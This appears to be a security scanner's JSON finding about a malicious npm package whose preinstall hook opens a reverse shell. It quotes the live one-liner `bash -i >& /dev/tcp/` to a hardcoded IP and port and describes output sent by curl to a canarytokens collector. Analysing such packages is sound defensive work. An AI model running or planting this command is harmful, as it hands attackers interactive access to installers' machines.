  "summary": "preinstall reverse shell to hardcoded IP with canarytokens beacon",
  "details": "package.json declares a preinstall script that runs `bash -i >& /dev/tcp/147.93.157.202/8080` to open an interactive reverse shell from the installer's machine to a hardcoded remote host on port 8080, and pipes session output via curl to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. The hook fires automatically on `npm install`, granting a remote party interactive shell access on the installer host and forwarding shell output to a third-party out-of-band collector over plain HTTP.",
